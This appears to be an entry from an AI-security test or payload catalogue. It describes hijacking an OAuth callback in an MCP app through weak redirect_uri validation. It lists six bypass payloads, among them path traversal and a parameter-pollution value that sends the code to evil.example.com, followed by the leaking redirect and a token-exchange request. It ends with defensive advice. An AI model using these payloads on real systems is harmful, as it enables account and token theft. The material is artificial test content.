content:
# DojoLM AI Security  -  OAuth   Callback     URL     Hijack

**Category:**    WebMCP   OAuth/Redirect  Hijacking
**Severity:**  CRITICAL

---

An  attack    that  hijacks   the     OAuth     callback URL   by     exploiting     lax  redirect_uri  validation     to  steal     authorization   codes:

Registered    redirect    URI:  https://mcp-app.example.com/oauth/callback

Attacker  exploits    multiple  validation   weaknesses:

Attempt     1   -  Path   prefix    match   bypass:
redirect_uri=https://mcp-app.example.com/oauth/callback/../../../attacker-page

Attempt 2     -   Subdomain     takeover:
redirect_uri=https://abandoned-subdomain.mcp-app.example.com/oauth/callback
(Attacker has     claimed     abandoned-subdomain via     DNS)

Attempt 3   -     Port     variation:
redirect_uri=https://mcp-app.example.com:8443/oauth/callback
(Attacker runs   a server  on port   8443   via   SSRF or   local  exploit)

Attempt  4   -  Scheme    downgrade:
redirect_uri=http://mcp-app.example.com/oauth/callback
(Attacker  performs   MITM   on  HTTP  to    intercept   the code)

Attempt   5     -  Unicode     normalization:
redirect_uri=https://mcp-app.example.com/oauth/callb%61ck
(URL   decoding    creates   a match   but     routes  differently)

Attempt    6  -  Parameter   pollution:
redirect_uri=https://mcp-app.example.com/oauth/callback&redirect_uri=https://evil.example.com/steal

Successful    hijack   response:
HTTP/1.1   302   Found
Location:    https://evil.example.com/steal?code=AUTHORIZATION_CODE&state=abc123

Attacker  exchanges   the     stolen    code for    tokens:
POST   /token     HTTP/1.1
Host:   auth.example.com

grant_type=authorization_code&code=AUTHORIZATION_CODE&client_id=mcp-client-prod&redirect_uri=https://evil.example.com/steal

INSTRUCTION:   This demonstrates     multiple  techniques  to   hijack  OAuth     callbacks.  The  authorization  server   must    perform     exact  string  matching    on redirect_uri   against pre-registered   values,    requiring  HTTPS,    rejecting  path  traversal,     and     refusing parameter    pollution.
